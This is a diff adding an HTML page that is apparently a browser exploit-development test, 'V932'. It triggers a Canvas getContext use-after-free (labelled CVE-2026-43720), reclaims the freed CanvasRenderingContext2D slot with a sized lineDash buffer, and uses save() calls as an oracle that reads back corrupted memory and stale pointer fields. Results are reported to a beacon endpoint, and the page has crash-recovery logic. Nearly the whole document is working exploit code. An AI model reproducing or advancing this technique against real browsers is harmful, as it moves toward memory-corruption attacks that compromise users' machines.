@@ -1,0 +1,182 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="30;url=/">
+<title>V932</title>
+<style>body{background:#000;color:#0f0;font:11px monospace}#log{white-space:pre-wrap}</style>
+</head><body><div id="log"></div><script>
+// V932 -- LINEDASH BUFFER RECLAIM ORACLE
+// Tests whether a 768B lineDash buffer (96 doubles) reclaims the freed CRC2D slot,
+// and whether save() mutations at CRC2D+592 are visible through getLineDash()[74].
+//
+// Technique:
+//   1. Create pre-existing CRC2D (before UAF)
+//   2. Trigger Canvas getContext UAF (CVE-2026-43720)
+//   3. IMMEDIATELY: pre_ctx.setLineDash(Array(96).fill(1.0)) -> 768B buffer from fastMalloc
+//      The 768B buffer should reclaim the freed CRC2D slot (LIFO free list)
+//   4. inner.save() x 42 -> increments m_unrealizedSaveCount at CRC2D+592
+//      CRC2D+592 = byte 592 of the lineDash buffer = low 32 bits of double[74]
+//   5. pre_ctx.getLineDash()[74]: if mutated from 1.0, the buffer IS at the CRC2D slot
+//
+// Expected: double[74] = 1.0 (0x3FF0000000000000) becomes 0x3FF000000000002A (1.0 + 42*2^-52)
+//
+// GC RISK: GC visitAdditionalChildren uses vtable at CRC2D+0 (= double[0] = 1.0 = invalid vtable).
+// If GC fires between setLineDash and save() completion, it will crash. Death recovery handles this.
+// The window is ~1ms, GC should be rare.
+//
+// Controls:
+//   T1: 96-double lineDash (768B) -- should hit (matches CRC2D size class)
+//   T2: 48-double lineDash (384B) -- should NOT hit (wrong size class)
+//   T3: Verify exact save count extraction via Uint32Array
+
+var PRE='V932',B=1,LOG=document.getElementById('log');
+var PT=String(Date.now());
+function Lg(m){try{LOG.textContent+=m+'\n';}catch(e){}}
+function bea(stg,stage,d){
+  var s=('000'+B).slice(-3);B++;
+  var p='/beacon/'+PRE+'-'+s+'-'+stg+'-'+stage+'?d='+encodeURIComponent(d||'')+'&pt='+PT+'&t='+Date.now();
+  Lg(s+' '+stg+' '+stage+' '+d);
+  try{if(navigator.sendBeacon)navigator.sendBeacon(p);}catch(e){}
+  try{new Image().src=p;}catch(e){}
+  try{new Image().src=p+'&k=3';}catch(e){}
+}
+
+// Beacon pool
+var BI=1200,pool=[];for(var i=0;i<BI;i++)pool.push(new Image());
+window.addEventListener('error',function(e){bea('FAIL','JSERR',(e.message||'')+'|L'+e.lineno);});
+
+// Death recovery
+var HK='v932h',DONE=false;
+var h;try{h=JSON.parse(localStorage.getItem(HK)||'null');}catch(e){h=null;}
+if(!h)h={runs:0,deaths:0};
+function hs(){try{localStorage.setItem(HK,JSON.stringify(h));}catch(e){}}
+function park(){location.replace('/idle.html');}
+if(h.pending){
+  h.deaths++;h.pending=0;hs();
+  bea('PASS','RECOVER','prev-run='+h.runs+'|DIED-AT='+(h.stage||'?')+'|deaths='+h.deaths);
+  if(h.deaths>=5){bea('FAIL','GIVEUP','deaths='+h.deaths+'|parking');DONE=true;park();}
+}
+if(DONE){/* already parked */}else{
+h.runs++;h.pending=1;h.stage='boot';hs();
+var wd=setTimeout(function(){if(!DONE){DONE=true;h.pending=0;hs();bea('FAIL','WATCHDOG','stuck-at='+h.stage);park();}},15000);
+function stg(s){h.stage=s;hs();}
+
+// Phase 0: Pre-existing CRC2Ds (before UAF)
+stg('pre-ctx');
+var preC768=document.createElement('canvas');preC768.width=1;preC768.height=1;
+var pre768=preC768.getContext('2d');
+
+var preC384=document.createElement('canvas');preC384.width=1;preC384.height=1;
+var pre384=preC384.getContext('2d');
+
+bea('PASS','S1','pre-ctxs-ready');
+
+// Phase 1: UAF trigger
+stg('pre-trigger');
+var inner=null;
+var outer=document.createElement('canvas');outer.width=1;outer.height=1;
+document.body.appendChild(outer);
+var desc={};
+Object.defineProperty(desc,'alpha',{get:function(){
+  inner=outer.getContext('2d');
+  return true;
+},configurable:true});
+
+setTimeout(function(){
+  var threw='';
+  try{outer.getContext('bitmaprenderer',desc);}catch(e){threw=String(e&&e.message||e).slice(0,40);}
+  stg('post-trigger');
+  if(!inner){bea('FAIL','NO-HANDLE','threw='+threw);DONE=true;h.pending=0;hs();return;}
+  bea('PASS','S2','trigger-ok|inner-captured');
+
+  // Phase 2: IMMEDIATELY reclaim with lineDash buffers
+  // T1: 96 doubles = 768 bytes (should match CRC2D size class)
+  stg('reclaim');
+  var m768=new Array(96);for(var i=0;i<96;i++)m768[i]=1.0;
+  pre768.setLineDash(m768);
+
+  // T2: 48 doubles = 384 bytes (control -- wrong size class)
+  var m384=new Array(48);for(var i=0;i<48;i++)m384[i]=2.0;
+  pre384.setLineDash(m384);
+
+  bea('PASS','S3','reclaim-done|768B+384B');
+
+  // Phase 3: save() oracle -- increment m_unrealizedSaveCount at CRC2D+592
+  stg('oracle');
+  var SAVES=42;
+  var saveOk=true;
+  for(var i=0;i<SAVES;i++){
+    try{inner.save();}catch(e){
+      bea('FAIL','SAVE-ERR','i='+i+'|'+String(e&&e.message||e).slice(0,40));
+      saveOk=false;break;
+    }
+  }
+  if(!saveOk){DONE=true;h.pending=0;hs();clearTimeout(wd);setTimeout(park,300);return;}
+  bea('PASS','S4','saves='+SAVES);
+
+  // Phase 4: Read back -- check if lineDash was mutated
+  stg('scan');
+  var ld768=pre768.getLineDash();
+  var ld384=pre384.getLineDash();
+
+  // T1: 768B buffer -- double[74] should be mutated (CRC2D+592 = byte 592 = double[74])
+  var t1Hit=(ld768.length===96 && ld768[74]!==1.0);
+  var t1Val=ld768.length===96?ld768[74]:NaN;
+
+  // T2: 384B buffer -- double[74] does not exist (only 48 elements). No hit expected.
+  // But let's check if ANY element changed (shouldn't)
+  var t2Hit=false;
+  if(ld384.length===48){
+    for(var i=0;i<48;i++){if(ld384[i]!==2.0){t2Hit=true;break;}}
+  }
+
+  // Extract exact bits from T1
+  var lo768=0,hi768=0;
+  if(t1Hit){
+    var f64=new Float64Array(1);
+    var u32=new Uint32Array(f64.buffer);
+    f64[0]=t1Val;
+    lo768=u32[0];hi768=u32[1];
+  }
+
+  bea('PASS','T1-RESULT','hit='+t1Hit+'|val='+t1Val+'|lo=0x'+lo768.toString(16)+'|hi=0x'+hi768.toString(16));
+  bea('PASS','T2-RESULT','hit='+t2Hit+'|control-384B');
+
+  // Phase 5: Verdict
+  stg('verdict');
+  var verdict;
+  if(t1Hit && lo768===SAVES && !t2Hit){
+    verdict='LINEDASH-RECLAIM-CONFIRMED';
+  } else if(t1Hit && lo768!==SAVES){
+    verdict='T1-HIT-UNEXPECTED-COUNT|lo='+lo768+'|expected='+SAVES;
+  } else if(!t1Hit && !t2Hit){
+    verdict='NO-HIT|768B-did-not-reclaim';
+  } else if(t2Hit){
+    verdict='T2-UNEXPECTED-HIT|384B-should-not-match';
+  } else {
+    verdict='UNKNOWN|t1='+t1Hit+'|t2='+t2Hit;
+  }
+
+  // Also read a few more elements to check for stale pointer data
+  var extraInfo='';
+  if(ld768.length===96){
+    // double[0] = CRC2D+0 (vtable area -- should be 1.0 unless something else wrote here)
+    // double[4] = CRC2D+32 (m_canvas area)
+    // double[15] = CRC2D+120 (m_stateStack.m_buffer)
+    var f64b=new Float64Array(1);
+    var u32b=new Uint32Array(f64b.buffer);
+    var extras=[];
+    var indices=[0,3,4,15,16,38,39,74];
+    for(var k=0;k<indices.length;k++){
+      var idx=indices[k];
+      f64b[0]=ld768[idx];
+      extras.push('d'+idx+'=0x'+u32b[1].toString(16)+u32b[0].toString(16));
+    }
+    extraInfo=extras.join('|');
+  }
+
+  bea(t1Hit?'PASS':'FAIL','VERDICT',verdict);
+  if(extraInfo)bea('PASS','EXTRA',extraInfo);
+
+  DONE=true;h.pending=0;h.stage='done';hs();clearTimeout(wd);
+  setTimeout(park,800);
+},300);
+}
+</script></body></html>
